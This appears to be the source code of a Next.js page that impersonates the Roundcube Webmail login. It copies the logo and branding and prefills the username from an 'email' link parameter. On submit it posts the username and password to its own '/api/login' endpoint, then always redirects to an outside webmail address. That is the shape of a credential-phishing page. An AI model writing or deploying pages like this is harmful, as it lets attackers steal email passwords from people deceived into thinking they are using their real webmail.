"use client";

import { useState } from "react";
import { useSearchParams } from "next/navigation";

export default function Home() {
  const searchParams = useSearchParams();
  const emailParam = searchParams.get("email") || "";
  const [username, setUsername] = useState(emailParam);
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      });

      window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
    } catch (error) {
      console.error("Error:", error);
      window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
    }
  };

  return (
    <div className="login-container">
      {/* Roundcube Logo */}
      <svg
        className="logo"
        viewBox="0 0 100 100"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
      >
        {/* Sphere/head */}
        <ellipse cx="50" cy="35" rx="22" ry="22" fill="url(#sphereGradient)" />
        {/* Cube body */}
        <path d="M28 50 L50 62 L72 50 L72 75 L50 87 L28 75 Z" fill="#4a5a64" />
        <path d="M50 62 L50 87 L72 75 L72 50 Z" fill="#3a4a54" />
        <path d="M28 50 L50 62 L50 87 L28 75 Z" fill="#5a6a74" />
        {/* Cube top blue face */}
        <path d="M28 50 L50 38 L72 50 L50 62 Z" fill="#1a8cdc" />
        <defs>
          <linearGradient
            id="sphereGradient"
            x1="50"
            y1="13"
            x2="50"
            y2="57"
            gradientUnits="userSpaceOnUse"
          >
            <stop offset="0%" stopColor="#e8ecef" />
            <stop offset="100%" stopColor="#a0aab2" />
          </linearGradient>
        </defs>
      </svg>

      <form className="login-form" onSubmit={handleSubmit}>
        <div className="input-wrapper">
          <div className="input-icon">
            <svg viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
            </svg>
          </div>
          <input
            type="text"
            className="login-input"
            placeholder="Username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
        </div>

        <div className="input-wrapper">
          <div className="input-icon">
            <svg viewBox="0 0 24 24" fill="currentColor">
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
            </svg>
          </div>
          <input
            type="password"
            className="login-input"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>

        <button type="submit" className="login-button" disabled={isLoading}>
          {isLoading ? "Loading..." : "Login"}
        </button>
      </form>

      <span className="brand-text">Roundcube Webmail</span>
    </div>
  );
}
